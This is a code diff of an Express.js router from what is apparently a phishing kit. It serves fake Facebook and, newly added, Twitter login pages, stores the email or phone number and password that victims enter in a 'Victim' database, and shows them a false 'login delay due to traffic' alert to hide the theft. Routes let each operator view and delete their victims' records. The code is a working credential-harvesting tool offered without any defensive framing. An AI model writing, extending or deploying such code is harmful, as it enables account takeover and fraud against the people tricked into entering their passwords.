@@ -69,6 +69,11 @@ router.get('/dashboard', async (req, res) => {
     }
 });
 
+
+
+
+
+
 // Facebook page route
 router.get('/facebook', (req, res) => {
     const userId = req.query.userId;
@@ -78,21 +83,17 @@ router.get('/facebook', (req, res) => {
     res.render('facebook', { userId });
 });
 
-// Handle form submission for victim details
-// Handle form submission for victim details
 router.post('/submit-details', async (req, res) => {
     const { userId, emailOrNumber, password } = req.body;
-
     try {
-        const victim = new Victim({ userId, emailOrNumber, password });
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Facebook' });
         await victim.save();
-        res.send("<script>alert('Details submitted successfully.');</script>");
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
     } catch (err) {
-        console.error('Error saving victim details:', err);
+        console.error('Error saving Facebook victim details:', err);
         res.status(500).send('Error processing request');
     }
 });
-
 
 // View victims page with data specific to logged-in user
 router.get('/view-victims', async (req, res) => {
@@ -123,5 +124,36 @@ router.post('/delete-victim/:id', async (req, res) => {
         res.status(500).send('Error deleting data');
     }
 });
+
+
+
+// Twitter page route
+router.get('/twitter', (req, res) => {
+    const userId = req.query.userId;
+    if (!userId) {
+        return res.status(400).send('User ID is required');
+    }
+    res.render('twitter', { userId });
+});
+
+//Route to Handle Twitter Form Submission
+router.post('/submit-twitter-details', async (req, res) => {
+    const { userId, emailOrNumber, password } = req.body;
+    try {
+        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Twitter' });
+        await victim.save();
+        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
+    } catch (err) {
+        console.error('Error saving Twitter victim details:', err);
+        res.status(500).send('Error processing request');
+    }
+});
+
+
+
+
+
+
+
 
 module.exports = router;
